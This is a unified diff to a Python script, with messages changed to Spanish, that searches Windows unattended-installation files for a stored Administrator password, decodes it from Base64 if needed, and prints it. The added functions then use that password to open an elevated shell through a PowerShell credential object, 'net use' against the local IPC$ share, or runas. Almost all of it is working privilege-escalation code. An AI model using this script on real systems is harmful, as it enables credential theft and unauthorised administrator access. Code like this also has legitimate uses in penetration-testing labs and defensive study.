@@ -2,6 +2,7 @@ import os
 import re
 import base64
 import subprocess
+import sys
 
 # Define file paths to check
 FILE_PATHS = [
@@ -29,7 +30,6 @@ def extract_password_from_file(file_path):
             match = PASSWORD_PATTERN.search(content)
             if match:
                 password = match.group(1).strip()
-                # Remove any XML entities or special characters
                 password = clean_password(password)
                 return password if password else None
     except Exception as e:
@@ -46,9 +46,7 @@ def clean_password(password):
     Returns:
         str: Cleaned password
     """
-    # Remove extra whitespace, newlines, and carriage returns
     password = password.strip()
-    # Handle common XML entities
     password = password.replace('&amp;', '&')
     password = password.replace('&lt;', '<')
     password = password.replace('&gt;', '>')
@@ -67,9 +65,7 @@ def is_valid_base64(string):
         bool: True if valid Base64, False otherwise
     """
     try:
-        # Check if it's valid base64
         decoded = base64.b64decode(string, validate=True)
-        # Try to decode as UTF-8
         decoded.decode('utf-8')
         return True
     except Exception:
@@ -85,85 +81,168 @@ def decode_password(password):
     Returns:
         tuple: (decoded_password, is_base64)
     """
-    # Remove any whitespace
     clean_pwd = password.strip()
     
-    # Try to decode as Base64
     try:
-        # First check if it looks like Base64
         if is_valid_base64(clean_pwd):
             decoded = base64.b64decode(clean_pwd).decode('utf-8', errors='ignore')
             return decoded, True
     except Exception:
         pass
     
-    # If we get here, it's not valid Base64
     return password, False
 
-def start_admin_session(password):
+def start_admin_session_with_powershell(password):
     """
-    Start an administrative session using the extracted password.
+    Start an administrative session using PowerShell with the password.
+    
+    Args:
+        password (str): Administrator password
+        
+    Returns:
+        bool: True if successful, False otherwise
+    """
+    # Escapar caracteres especiales para PowerShell
+    escaped_password = password.replace('"', '`"').replace('$', '`$')
+    
+    # Crear script de PowerShell
+    ps_script = f'''
+    $username = "Administrator"
+    $password = ConvertTo-SecureString "{escaped_password}" -AsPlainText -Force
+    $credential = New-Object System.Management.Automation.PSCredential($username, $password)
+    Start-Process cmd.exe -Credential $credential -Verb RunAs -WindowStyle Normal
+    '''
+    
+    try:
+        print("[*] Iniciando sesión administrativa con PowerShell...")
+        
+        # Ejecutar PowerShell con el script
+        subprocess.run([
+            'powershell',
+            '-Command',
+            ps_script
+        ], shell=True)
+        
+        print("[+] Sesión administrativa iniciada correctamente")
+        return True
+        
+    except Exception as e:
+        print(f"[-] Error al iniciar sesión: {e}")
+        return False
+
+def start_admin_session_with_net_use(password):
+    """
+    Alternative method using net use with credentials.
+    
+    Args:
+        password (str): Administrator password
+        
+    Returns:
+        bool: True if successful, False otherwise
+    """
+    try:
+        print("[*] Intentando método alternativo con net use...")
+        
+        # Crear conexión con credenciales
+        subprocess.run([
+            'net', 'use',
+            '\\\\localhost\\IPC$',
+            '/user:Administrator',
+            password
+        ], shell=True)
+        
+        print("[+] Conexión establecida. Iniciando cmd...")
+        subprocess.run(['cmd.exe'], shell=True)
+        return True
+        
+    except Exception as e:
+        print(f"[-] Error: {e}")
+        return False
+
+def start_admin_session_manual(password):
+    """
+    Provide manual instructions for starting admin session.
     
     Args:
         password (str): Administrator password
     """
-    print("\n[!] Use this password with the following command:")
+    print("\n" + "=" * 60)
+    print("[!] MÉTODO MANUAL")
+    print("=" * 60)
+    print("\n[!] Usa esta contraseña con el siguiente comando:")
     print(f"    runas /user:Administrator cmd.exe")
-    print(f"    (Enter this password when prompted: {password})")
+    print(f"\n[!] Contraseña: {password}")
+    print("\n" + "=" * 60)
     
-    # Optionally start the admin session automatically
     try:
-        response = input("\n[?] Do you want to start an admin session now? (y/n): ").lower()
+        response = input("\n[?] ¿Quieres abrir runas ahora? (y/n): ").lower()
         if response == 'y':
-            print("[*] Starting admin session...")
-            command = 'runas /user:Administrator "cmd.exe /K echo Admin session started"'
-            subprocess.run(command, shell=True)
+            print(f"\n[*] Introduce la contraseña: {password}")
+            subprocess.run(['runas', '/user:Administrator', 'cmd.exe'], shell=True)
     except KeyboardInterrupt:
-        print("\n[!] Operation cancelled by user")
+        print("\n[!] Operación cancelada")
+
+def start_admin_session(password):
+    """
+    Start an administrative session using the extracted password.
+    Tries PowerShell first, then fallback to manual method.
+    
+    Args:
+        password (str): Administrator password
+    """
+    print("\n" + "=" * 60)
+    print("[*] INICIANDO SESIÓN ADMINISTRATIVA")
+    print("=" * 60)
+    
+    # Primero intentar con PowerShell
+    if start_admin_session_with_powershell(password):
+        return
+    
+    # Si falla, mostrar método manual
+    print("\n[!] El método automático falló. Usando método manual...")
+    start_admin_session_manual(password)
 
 def main():
-    print("[*] Starting Windows administrator password extraction...")
-    print("[*] Checking common unattended installation files\n")
+    print("[*] Iniciando extracción de contraseña de administrador de Windows...")
+    print("[*] Revisando archivos comunes de instalación\n")
     
     admin_password = None
-    found_path = None
     
     for file_path in FILE_PATHS:
-        print(f"[-] Checking file: {file_path}")
+        print(f"[-] Revisando archivo: {file_path}")
         
         if not os.path.exists(file_path):
-            print("[-] File not found\n")
+            print("[-] Archivo no encontrado\n")
             continue
         
-        print(f"[+] File found: {file_path}")
+        print(f"[+] Archivo encontrado: {file_path}")
         admin_password = extract_password_from_file(file_path)
         
         if admin_password:
-            print(f"[+] Password extracted successfully from: {file_path}")
-            found_path = file_path
+            print(f"[+] Contraseña extraída correctamente de: {file_path}")
             break
         else:
-            print("[-] No password found in this file\n")
+            print("[-] No se encontró contraseña en este archivo\n")
     
     if not admin_password:
-        print("[-] No administrator password found in known file locations.")
-        print("[!] Consider checking other system directories or log files.")
+        print("[-] No se encontró contraseña de administrador en las ubicaciones conocidas.")
+        print("[!] Revisa otros directorios o archivos de log.")
         return
     
-    # Show the extracted password
-    print(f"\n[+] Raw extracted password: {admin_password}")
+    # Mostrar la contraseña extraída
+    print(f"\n[+] Contraseña extraída: {admin_password}")
     
-    # Attempt to decode if Base64
+    # Intentar decodificar si es Base64
     decoded_password, is_base64 = decode_password(admin_password)
     
     if is_base64:
-        print(f"[+] Base64 decoded password: {decoded_password}")
+        print(f"[+] Contraseña decodificada (Base64): {decoded_password}")
         final_password = decoded_password
     else:
-        print("[+] Password is in plaintext (not Base64 encoded)")
+        print("[+] La contraseña está en texto plano (no está codificada en Base64)")
         final_password = admin_password
     
-    # Start admin session
+    # Iniciar sesión administrativa
     start_admin_session(final_password)
 
 if __name__ == "__main__":
